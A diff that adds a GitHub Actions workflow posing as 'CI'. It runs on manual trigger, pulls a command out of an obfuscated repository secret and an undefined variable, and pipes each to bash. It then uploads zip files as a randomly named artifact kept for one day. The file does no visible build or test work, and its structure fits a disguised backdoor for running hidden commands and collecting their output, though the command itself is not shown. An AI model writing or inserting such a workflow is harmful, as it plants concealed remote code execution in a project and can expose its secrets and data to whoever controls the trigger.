@@ -1,0 +1,25 @@
+name: CI
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          rca83519: ${{ secrets.rca83519 }}
+        run: |
+          printf '%s' "$rca83519" | jq -r .kc5022 | /bin/bash
+          echo $lwr5960 | jq -r .fm07 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: l8BJrjod
+          path: "*.zip"
+          retention-days: 1
